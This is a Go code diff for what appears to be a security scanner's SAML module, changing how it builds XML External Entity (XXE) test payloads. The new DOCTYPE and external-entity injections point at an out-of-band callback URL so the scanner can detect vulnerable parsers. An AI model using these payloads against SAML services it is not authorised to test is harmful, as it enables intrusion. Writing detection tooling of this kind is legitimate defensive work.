@@ -5,11 +5,11 @@ import (
 	stderrors "errors"
 	"fmt"
 	"io"
-	"math/rand"
 	"regexp"
 	"strings"
 
 	"github.com/pkg/errors"
+	"github.com/vigolium/vigolium/pkg/modules/modkit"
 )
 
 // XMLDocument represents a parsed XML document.
@@ -66,8 +66,11 @@ func extractIDAttribute(content string) string {
 	return ""
 }
 
-// InjectDOCTYPE creates a payload with DOCTYPE injection.
-func InjectDOCTYPE(doc *XMLDocument, decoded *DecodedSAML) (string, error) {
+// InjectDOCTYPE creates a payload with an external-DTD DOCTYPE pointing at the
+// supplied out-of-band (OAST) callback URL. If the target's XML parser loads the
+// external DTD subset, it fetches systemURL and the OAST server records an
+// interaction — the only signal that confirms the parser processes external DTDs.
+func InjectDOCTYPE(doc *XMLDocument, decoded *DecodedSAML, systemURL string) (string, error) {
 	if doc.HasDoctype {
 		return "", errors.New("document already has DOCTYPE")
 	}
@@ -75,14 +78,18 @@ func InjectDOCTYPE(doc *XMLDocument, decoded *DecodedSAML) (string, error) {
 	// Remove XML declaration if present
 	content := removeXMLDeclaration(doc.Content)
 
-	// Inject DOCTYPE before XML content
-	payload := `<!DOCTYPE root SYSTEM "example.dtd">` + content
+	// Inject an external-DTD DOCTYPE referencing the OAST callback URL.
+	payload := fmt.Sprintf(`<!DOCTYPE root SYSTEM "%s">`, systemURL) + content
 
 	return EncodeSAML(payload, decoded), nil
 }
 
-// InjectENTITY creates a payload with ENTITY injection.
-func InjectENTITY(doc *XMLDocument, decoded *DecodedSAML) (string, error) {
+// InjectENTITY creates a payload that declares an external general entity pointing
+// at the supplied OAST callback URL and references it in the document body (in
+// place of the original ID value). If the parser resolves and expands the entity,
+// it fetches systemURL and the OAST server records an interaction — out-of-band
+// proof of XXE, replacing the previous response-shape heuristic.
+func InjectENTITY(doc *XMLDocument, decoded *DecodedSAML, systemURL string) (string, error) {
 	if doc.HasDoctype {
 		return "", errors.New("document already has DOCTYPE")
 	}
@@ -95,15 +102,15 @@ func InjectENTITY(doc *XMLDocument, decoded *DecodedSAML) (string, error) {
 	content := removeXMLDeclaration(doc.Content)
 
 	// Replace ID value with entity reference
-	placeholder := "PLACEHOLDER_UUID_" + randomString(8)
+	placeholder := "PLACEHOLDER_UUID_" + modkit.RandomAlnum(8)
 	modifiedContent := replaceIDValue(content, doc.IDAttrVal, placeholder)
 
-	// Create DOCTYPE with ENTITY referencing original ID
-	doctype := fmt.Sprintf(`<!DOCTYPE foo [ <!ENTITY uuid SYSTEM "%s"> ]>`, doc.IDAttrVal)
+	// Declare an external entity pointing at the OAST callback URL.
+	doctype := fmt.Sprintf(`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "%s"> ]>`, systemURL)
 
-	// Build final payload
+	// Build final payload, referencing the entity where the ID value used to be.
 	payload := doctype + modifiedContent
-	payload = strings.Replace(payload, placeholder, "&uuid;", 1)
+	payload = strings.Replace(payload, placeholder, "&xxe;", 1)
 
 	return EncodeSAML(payload, decoded), nil
 }
@@ -119,19 +126,20 @@ func removeXMLDeclaration(content string) string {
 	return content
 }
 
-// replaceIDValue replaces the ID attribute value in XML (case-insensitive to match extractIDAttribute).
-func replaceIDValue(content, oldValue, newValue string) string {
-	// Use case-insensitive regex to replace ID="oldValue" with ID="newValue"
-	// Must match case-insensitivity of extractIDAttribute regex
-	pattern := regexp.MustCompile(fmt.Sprintf(`(?i)(\bID\s*=\s*["'])%s(["'])`, regexp.QuoteMeta(oldValue)))
-	return pattern.ReplaceAllString(content, "${1}"+newValue+"${2}")
-}
+// idAttrPattern captures an ID attribute and its quoted value, case-insensitive
+// to match extractIDAttribute. Compiled once at package init; replaceIDValue
+// filters on the captured value instead of baking oldValue into a per-call
+// compiled pattern.
+var idAttrPattern = regexp.MustCompile(`(?i)(\bID\s*=\s*["'])([^"']*)(["'])`)
 
-func randomString(length int) string {
-	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
-	b := make([]byte, length)
-	for i := range b {
-		b[i] = charset[rand.Intn(len(charset))]
-	}
-	return string(b)
+// replaceIDValue replaces occurrences of ID="oldValue" with ID="newValue"
+// (case-insensitive on the attribute name, exact match on the value).
+func replaceIDValue(content, oldValue, newValue string) string {
+	return idAttrPattern.ReplaceAllStringFunc(content, func(m string) string {
+		sub := idAttrPattern.FindStringSubmatch(m)
+		if len(sub) == 4 && sub[2] == oldValue {
+			return sub[1] + newValue + sub[3]
+		}
+		return m
+	})
 }
